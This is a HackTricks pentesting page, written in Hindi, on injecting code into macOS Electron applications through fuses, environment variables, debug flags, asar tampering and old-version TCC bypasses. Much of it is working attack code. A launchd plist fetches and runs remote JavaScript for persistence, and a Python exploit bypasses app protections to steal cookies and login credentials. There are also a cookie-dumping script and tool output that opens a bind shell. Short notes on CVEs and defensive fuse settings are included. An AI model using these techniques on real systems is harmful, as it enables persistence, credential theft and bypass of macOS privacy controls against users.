# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

यदि आपको नहीं पता कि Electron क्या है, तो आपको [**यहाँ बहुत सारी जानकारी मिल सकती है**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation)। लेकिन अभी इतना जान लें कि Electron **node** चलाता है।\
और node में कुछ **parameters** और **env variables** होते हैं, जिनका उपयोग संकेतित file के अलावा अन्य code को **execute कराने** के लिए किया जा सकता है।

### Electron Fuses

इन techniques पर आगे चर्चा की जाएगी, लेकिन हाल के समय में Electron ने इन्हें रोकने के लिए कई **security flags** जोड़े हैं। इन्हें [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) कहा जाता है और ये macOS में Electron apps को **arbitrary code लोड करने** से **रोकने** के लिए उपयोग किए जाते हैं:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: यदि disabled हो, तो यह code inject करने के लिए **`ELECTRON_RUN_AS_NODE`** env var के उपयोग को रोकता है।
- **`EnableNodeCliInspectArguments`**: यदि disabled हो, तो `--inspect`, `--inspect-brk` जैसे params को स्वीकार नहीं किया जाएगा। इस प्रकार code inject करने का तरीका रुक जाता है।
- **`EnableEmbeddedAsarIntegrityValidation`**: यदि enabled हो, तो loaded **`asar`** **file** को macOS द्वारा **validate** किया जाएगा। इस प्रकार इस file के contents को modify करके होने वाली **code injection** को **रोका** जाता है।
- **`OnlyLoadAppFromAsar`**: यदि यह enabled हो, तो निम्न क्रम में load करने के लिए खोजने के बजाय: **`app.asar`**, **`app`** और अंत में **`default_app.asar`**। यह केवल app.asar को check और use करेगा, जिससे यह सुनिश्चित होता है कि **`embeddedAsarIntegrityValidation`** fuse के साथ **combined** होने पर **non-validated code लोड करना असंभव** हो।
- **`LoadBrowserProcessSpecificV8Snapshot`**: यदि enabled हो, तो browser process अपने V8 snapshot के लिए `browser_v8_context_snapshot.bin` नामक file का उपयोग करता है।

एक अन्य दिलचस्प fuse, जो code injection को नहीं रोकेगा, यह है:

- **EnableCookieEncryption**: यदि enabled हो, तो disk पर cookie store को OS level cryptography keys का उपयोग करके encrypt किया जाता है।

### Checking Electron Fuses

आप किसी application से इन flags को इस प्रकार **check** कर सकते हैं:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Electron Fuses को संशोधित करना

जैसा कि [**docs में बताया गया है**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), **Electron Fuses** का configuration **Electron binary** के अंदर configure किया जाता है, जिसमें कहीं न कहीं **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** string मौजूद होती है।<sup>[[1]](#references)</sup>

macOS applications में यह आमतौर पर `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework` में होती है.
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
आप इस file को [https://hexed.it/](https://hexed.it/) में load कर सकते हैं और पिछली string को search कर सकते हैं। इस string के बाद आप ASCII में एक number "0" या "1" देख सकते हैं, जो यह दर्शाता है कि प्रत्येक fuse disabled है या enabled। **fuse values को modify करने** के लिए बस hex code (`0x30` `0` है और `0x31` `1` है) को modify करें।

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यदि आप इन bytes को modify करने के बाद किसी application के अंदर **`Electron Framework` binary** को **overwrite** करने का प्रयास करते हैं, तो app run नहीं होगा।

## Electron Applications में code जोड़कर RCE

किसी Electron App द्वारा उपयोग की जाने वाली **external JS/HTML files** हो सकती हैं, इसलिए attacker इन files में code inject कर सकता है, जिनकी signature check नहीं की जाएगी, और app के context में arbitrary code execute कर सकता है।

> [!CAUTION]
> हालांकि, वर्तमान में 2 limitations हैं:
>
> - किसी App को modify करने के लिए **`kTCCServiceSystemPolicyAppBundles`** permission **needed** है, इसलिए default रूप से अब यह संभव नहीं है।
> - Compiled **`asap`** file में आमतौर पर **`embeddedAsarIntegrityValidation`** `और` **`onlyLoadAppFromAsar`** fuses **enabled** होते हैं।
>
> इससे यह attack path अधिक complicated (या impossible) हो जाता है।

ध्यान दें कि **`kTCCServiceSystemPolicyAppBundles`** की requirement को application को किसी अन्य directory (जैसे **`/tmp`**) में copy करके, **`app.app/Contents`** folder का नाम बदलकर **`app.app/NotCon`**, अपने **malicious** code के साथ **`asar`** file को **modifying** करके, उसका नाम वापस **`app.app/Contents`** रखकर और उसे execute करके bypass करना संभव है।<sup>[[5]](#references)</sup>

आप asar file से code को इस command से unpack कर सकते हैं:
```bash
npx asar extract app.asar app-decomp
```
और इसे इससे modify करने के बाद फिर से pack करें:
```bash
npx asar pack app-decomp app-new.asar
```
## ELECTRON_RUN_AS_NODE के साथ RCE

[**docs**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node) के अनुसार, यदि यह env variable सेट किया जाता है, तो यह process को एक सामान्य Node.js process के रूप में शुरू करेगा।<sup>[[6]](#references)</sup>
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> यदि **`RunAsNode`** fuse disabled है, तो env var **`ELECTRON_RUN_AS_NODE`** को ignore कर दिया जाएगा और यह काम नहीं करेगा।

### App Plist से Injection

जैसा कि [**यहाँ प्रस्तावित किया गया है**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), persistence बनाए रखने के लिए आप plist में इस env variable का abuse कर सकते हैं:<sup>[[2]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## `NODE_OPTIONS` के साथ RCE

आप payload को किसी अलग file में store करके उसे execute कर सकते हैं:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> यदि fuse **`EnableNodeOptionsEnvironmentVariable`** **disabled** है, तो launch किए जाने पर app env var **NODE_OPTIONS** को **ignore** कर देगा, जब तक कि env variable **`ELECTRON_RUN_AS_NODE`** set न हो; fuse **`RunAsNode`** **disabled** होने पर इसे भी **ignore** कर दिया जाएगा।
>
> यदि आप **`ELECTRON_RUN_AS_NODE`** set नहीं करते हैं, तो आपको यह **error** मिलेगा: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### App Plist से Injection

आप persistence बनाए रखने के लिए plist में इस env variable का abuse करके ये keys add कर सकते हैं:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## inspecting के साथ RCE

[**इस**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) के अनुसार, यदि आप **`--inspect`**, **`--inspect-brk`** और **`--remote-debugging-port`** जैसे flags के साथ कोई Electron application execute करते हैं, तो एक **debug port open हो जाएगा**, जिससे आप उससे connect कर सकते हैं (उदाहरण के लिए Chrome में `chrome://inspect` से) और उस पर **code inject** करने या नए processes launch करने में भी सक्षम होंगे।<sup>[[7]](#references)</sup>\
उदाहरण:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
[**इस blogpost**](https://hackerone.com/reports/1274695) में, इस debugging का दुरुपयोग करके headless chrome को **मनमाने स्थानों पर मनमानी फ़ाइलें download करने** के लिए मजबूर किया जाता है।<sup>[[8]](#references)</sup>

> [!TIP]
> यदि किसी app के पास यह जाँचने का अपना तरीका है कि env variables या `--inspect` जैसे params सेट हैं या नहीं, तो आप arg `--inspect-brk` का उपयोग करके runtime में इसे **bypass** करने का प्रयास कर सकते हैं, जो app की शुरुआत में ही **execution रोक देगा** और bypass execute करेगा (उदाहरण के लिए, current process के args या env variables को overwrite करके)।

निम्नलिखित एक exploit था जिसमें app को `--inspect-brk` param के साथ monitor और execute करने पर उसके पास मौजूद custom protection को bypass करना संभव था (process के params को overwrite करके `--inspect-brk` हटाना) और फिर app से cookies और credentials dump करने के लिए एक JS payload inject करना संभव था:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> यदि fuse **`EnableNodeCliInspectArguments`** disabled है, तो app launch होने पर **node parameters** (जैसे **`--inspect`**) को **ignore** करेगा, जब तक कि env variable **`ELECTRON_RUN_AS_NODE`** set न हो। यदि fuse **`RunAsNode`** disabled है, तो इसे भी **ignore** किया जाएगा।
>
> हालांकि, आप अभी भी **electron param `--remote-debugging-port=9229`** का उपयोग कर सकते हैं, लेकिन पिछले payload से अन्य processes execute नहीं होंगे।

Param **`--remote-debugging-port=9222`** का उपयोग करके Electron App से कुछ information चुराना संभव है, जैसे **history** (GET commands के साथ) या browser के **cookies** (क्योंकि वे browser के अंदर **decrypted** होते हैं और एक **json endpoint** मौजूद है जो उन्हें उपलब्ध कराएगा)।

आप इसे [**यहां**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) और [**यहां**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) सीख सकते हैं और automatic tool [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) या इस तरह की simple script का उपयोग कर सकते हैं:<sup>[[9]](#references)[[10]](#references)</sup>
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### App Plist से Injection

Persistence बनाए रखने के लिए plist में इस env variable का abuse करके ये keys जोड़ सकते हैं:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## पुराने Versions का दुरुपयोग करके TCC Bypass

> [!TIP]
> macOS का TCC daemon application के executed version की जाँच नहीं करता। इसलिए यदि आप पिछली techniques में से किसी के द्वारा **किसी Electron application में code inject नहीं कर सकते**, तो आप APP का कोई पुराना version download करके उसमें code inject कर सकते हैं, क्योंकि उसे अभी भी TCC privileges मिलेंगे (जब तक Trust Cache इसे रोकता नहीं है)।

## गैर-JS Code चलाना

पिछली techniques आपको **Electron application के process के अंदर JS code चलाने** की अनुमति देंगी। हालांकि, याद रखें कि **child processes, parent application के समान sandbox profile के अंतर्गत चलते हैं और उसकी TCC permissions inherit करते हैं**।\
इसलिए, यदि आप camera या microphone तक access पाने के लिए entitlements का दुरुपयोग करना चाहते हैं, तो आप **process से कोई अन्य binary चला** सकते हैं।

## उल्लेखनीय Electron macOS Vulnerabilities (2023-2024)

### CVE-2023-44402 – ASAR integrity bypass

Electron ≤22.3.23 और विभिन्न 23-27 pre-releases में `.app/Contents/Resources` folder तक write access रखने वाला attacker `embeddedAsarIntegrityValidation` **और** `onlyLoadAppFromAsar` fuses को bypass कर सकता था। यह bug integrity checker में *file-type confusion* के कारण था, जिससे validated archive के बजाय **`app.asar` नाम की crafted directory** load हो जाती थी। इसलिए उस directory के अंदर रखा गया कोई भी JavaScript app के start होने पर execute हो जाता था। इस वजह से वे vendors भी macOS पर vulnerable थे जिन्होंने hardening guidance का पालन करके दोनों fuses enable किए थे।<sup>[[3]](#references)</sup>

Patched Electron versions: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** और **27.0.0-alpha.7**। यदि attackers को कोई application पुराने build पर चलती हुई मिलती है, तो वे code को application के TCC entitlements के साथ execute करने के लिए `Contents/Resources/app.asar` को अपनी directory से overwrite कर सकते हैं।<sup>[[3]](#references)</sup>

### 2024 “RunAsNode” / “enableNodeCliInspectArguments” CVE cluster

जनवरी 2024 में CVEs की एक series (CVE-2024-23738 से CVE-2024-23743 तक) ने यह उजागर किया कि कई Electron apps अभी भी **RunAsNode** और **EnableNodeCliInspectArguments** fuses को enabled रखकर ship किए जाते हैं। इसलिए, एक local attacker environment variable `ELECTRON_RUN_AS_NODE=1` या `--inspect-brk` जैसे flags के साथ program को relaunch करके उसे *generic* Node.js process में बदल सकता है और application की सभी sandbox तथा TCC permissions inherit कर सकता है।<sup>[[4]](#references)</sup>

हालांकि Electron team ने “critical” rating पर आपत्ति जताई और बताया कि attacker को पहले से local code–execution की आवश्यकता होती है, फिर भी यह issue post-exploitation के दौरान उपयोगी है, क्योंकि यह किसी भी vulnerable Electron bundle को एक *living-off-the-land* binary में बदल देता है, जो उदाहरण के लिए desktop app को पहले से मिली Contacts, Photos या अन्य sensitive resources को read कर सकता है।<sup>[[4]](#references)</sup>

Electron maintainers की defensive guidance:<sup>[[4]](#references)</sup>

* Production builds में `RunAsNode` और `EnableNodeCliInspectArguments` fuses को disable करें।
* यदि application को legitimately helper Node.js process की आवश्यकता है, तो उन fuses को फिर से enable करने के बजाय नए **UtilityProcess** API का उपयोग करें।

## Automatic Injection

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

Tool [**electroniz3r**](https://github.com/r3ggi/electroniz3r) का उपयोग installed **vulnerable electron applications को find करने और उनमें code inject करने** के लिए आसानी से किया जा सकता है। यह tool **`--inspect`** technique का उपयोग करने का प्रयास करेगा:<sup>[[5]](#references)</sup>

आपको इसे स्वयं compile करना होगा और इसका उपयोग इस तरह कर सकते हैं:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki को Electron applications में backdoor डालने के लिए बनाया गया था, जिसमें applications की JavaScript files को Loki Command & Control JavaScript files से replace किया जाता है।

## References

- [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [Third-Party Frameworks के माध्यम से MacOS Injection - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [filetype confusion के माध्यम से ASAR Integrity bypass (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] ['runAsNode' CVEs के संबंध में Statement - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRONizing macOS Privacy - Red Teaming Armory में एक New Weapon - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Environment Variables | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Electron apps आपके secrets को confidentially store क्यों नहीं कर सकते: --inspect option](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [HackerOne Report #1274695 - Electron debugging का abuse करके arbitrary files download करना](https://hackerone.com/reports/1274695)
- [9] [Hands in the Cookie Jar: Chromium के Remote Debugger Port से Cookies Dumping - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Chromium के Remote Debugger से Cookie Dumping Failures की Debugging - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
{{#include ../../../banners/hacktricks-training.md}}
